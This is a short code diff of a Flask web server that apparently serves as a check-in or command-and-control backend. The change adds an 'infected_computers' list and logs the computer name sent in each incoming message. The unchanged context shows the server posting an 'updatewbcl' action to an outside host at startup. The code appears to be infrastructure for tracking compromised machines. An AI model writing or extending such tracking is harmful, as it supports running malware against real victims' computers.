@@ -5,7 +5,9 @@ from flask import Flask, send_file, request, redirect, url_for
  
 app = Flask(__name__)
 CORS(app, supports_credentials=True)
+
 messages = []
+infected_computers = []
 
 requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'updatewbcl'})
 
@@ -40,6 +42,8 @@ def handle_messages():
     if request.method == 'POST':
         message = request.get_json()
         messages.append(message)
+        if message.get('computer_name'):
+            infected_computers.append(message.get('computer_name').upper())
         print('Recieved message: ', message)
         return {'status': 'success'}
     else:
